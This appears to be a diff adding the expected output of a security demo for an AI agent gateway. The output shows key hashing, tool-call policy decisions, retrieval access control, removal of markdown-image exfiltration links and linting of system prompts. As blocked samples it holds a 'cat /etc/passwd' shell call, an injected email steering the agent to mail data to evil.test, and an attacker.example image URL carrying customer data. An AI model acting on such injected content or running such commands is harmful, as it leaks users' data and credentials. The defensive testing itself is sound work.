@@ -1,0 +1,30 @@
+== 1. virtual keys: hash-only storage, revocation ==
+issued       : aigw_live_A-7kVr… | principal: Principal(tenant='acme', key_id='aigw_live_A-7kVr', user='alice', scopes=frozenset({'chat', 'tools:billing.read'}))
+stored as    : 4b01cb63c521f651e3d2d836…  (HMAC-SHA256, peppered)
+authenticate : acme
+after revoke : auth invalid key
+
+== 2. tool authorization: the model proposes, policy disposes ==
+-- context: only the user's own messages (clean) --
+search_invoices  {'customer': 'alice'}                         -> allow                  ok
+issue_refund     {'order_id': 'acme-1042', 'amount_eur': 40}   -> allow                  ok
+issue_refund     {'order_id': 'acme-1043', 'amount_eur': 900}  -> deny                   refunds above 200 EUR need a human
+issue_refund     {'order_id': 'globex-77', 'amount_eur': 10}   -> deny                   order belongs to another tenant
+close_account    {'customer': 'alice'}                         -> deny                   caller lacks scope 'tools:account.admin'
+exec_shell       {'cmd': 'cat /etc/passwd'}                    -> deny                   unknown tool
+-- context: the agent has now read an inbound email (untrusted) --
+search_invoices  {'customer': 'alice'}                         -> allow                  ok
+issue_refund     {'order_id': 'acme-1044', 'amount_eur': 40}   -> needs_human_approval   untrusted content in context (email:inbound/8812)
+send_email       {'to': 'billing-export@evil.test', 'body': 'a -> needs_human_approval   untrusted content in context (email:inbound/8812)
+
+== 3. retrieval ACLs: filter before ranking, not after generation ==
+naive   : ['hr-7', 'kb-9', 'kb-1']
+with ACL: ['kb-1']
+
+== 4. output handling: zero-click exfiltration via markdown images ==
+clean  : Your invoice total is 120 EUR.  See [the policy](https://docs.example.com/refunds) or click here.
+removed: ['https://attacker.example/p.png?d=acme-1042%20alice%40acme.test', 'https://evil.example/login']
+
+== 5. hidden context is discoverable: lint system prompts in CI ==
+support-bot/v3    ALLOW 
+billing-agent/v1  BLOCK secret in output ['anthropic_key']
